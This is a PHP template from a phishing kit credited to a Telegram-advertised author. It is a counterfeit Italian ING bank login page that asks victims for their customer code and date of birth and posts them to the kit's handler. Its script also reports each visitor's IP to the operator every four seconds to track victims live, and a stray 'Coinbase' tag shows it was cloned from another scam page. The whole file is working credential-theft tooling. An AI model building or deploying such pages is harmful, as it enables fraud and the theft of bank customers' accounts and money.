<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "login";

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>Login Area Riservata | ING</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
        <script src="<?php echo JSPATH; ?>/stutes.js"></script>      
    </head>
    <body class="d-flex flex-column justify-content-between" style="min-height:100vh;">

      <!-- HEADER -->
      <header class="header_1">
        <div class="container_header_1">
          <div class="logo">
            <img src="<?php echo IMGSPATH; ?>/logo.svg" alt="">
          </div>
        </div>
      </header>

      <!-- wrapper_login -->
      <div class="wrapper_login">
        <div class="container_login">
          <form action="index.php" method="POST">
                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="login">
            <div class="title">
              <h1 class="mb-0">Ciao! Entra in ING</h1>
              <p class="mb-0">Inserisci le tue credenziali per accedere.</p>
            </div>
                    
            <div class="inputes">
              <div class="form-group input_box <?php echo errclass($_SESSION['errors'],'username') ?>">
                <label for="username">Codice cliente</label>
                <input type="text" name="username" id="username" minlength="7" maxlength="12" inputmode="numeric" value="<?php echo get_value('username'); ?>">
                <?php echo errmsg($_SESSION['errors'],'username'); ?>
              </div>
              <div class="form-group input_box <?php echo errclass($_SESSION['errors'],'date') ?>">
                <label for="date">Data di nascita</label>
                <span>Formato gg/mm/aaaa</span>
                <input type="text" inputmode="numeric" name="date" id="date" inputmode="numeric" value="<?php echo get_value('date'); ?>">
                <?php echo errmsg($_SESSION['errors'],'date'); ?>
              </div>
            </div>
            <div class="btn_sub">
              <button type="submit">Continua</button>
            </div>
            <div class="forgets">
              <div class="link">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" focusable="false" aria-hidden="true"><path d="M5.860625,4.446625 C5.469625,4.055625 4.837625,4.055625 4.446625,4.446625 L-3.553375,12.446625 L-2.139375,13.860625 L5.153625,6.567625 L12.446625,13.860625 L13.860625,12.446625 L5.860625,4.446625 Z" transform="rotate(90 7.154 14.007)"></path></svg>
                <a href="">Non ricordi il Codice Cliente?</a>
              </div>
              <div class="link">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" focusable="false" aria-hidden="true"><path d="M5.860625,4.446625 C5.469625,4.055625 4.837625,4.055625 4.446625,4.446625 L-3.553375,12.446625 L-2.139375,13.860625 L5.153625,6.567625 L12.446625,13.860625 L13.860625,12.446625 L5.860625,4.446625 Z" transform="rotate(90 7.154 14.007)"></path></svg>
                <a href="">È davvero ING? Verifica la chiamata</a>
              </div>
            </div>
          </form>
        </div>
      </div>

      <!-- footer -->
      <footer class="footer_1">
        <div class="container_footer_1">
          <div class="links_footer">
            <ul class="ps-0 mb-0">
              <li>Sicurezza</li>
              <li>Definizione di Default</li>
              <li>Privacy</li>
            </ul>
            <ul class="ps-0 mb-0">
              <li>Trasparenza</li>
              <li>Reclami</li>
              <li>Cookies</li>
            </ul>
          </div>
          <div class="copyghit">
            <p class="mb-0">© 2026 ING BANK N.V. Milan Branch P.I. 11241140158</p>
          </div>
        </div>
      </footer>


      
       









        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="<?php echo JSPATH; ?>/script.js"></script>
        
        <script>
            $('#date').mask('00/00/0000');          
            $('#username').mask('000000000000'); 

               
            
            
            worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'login'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);              
        </script>
    </body>
</html>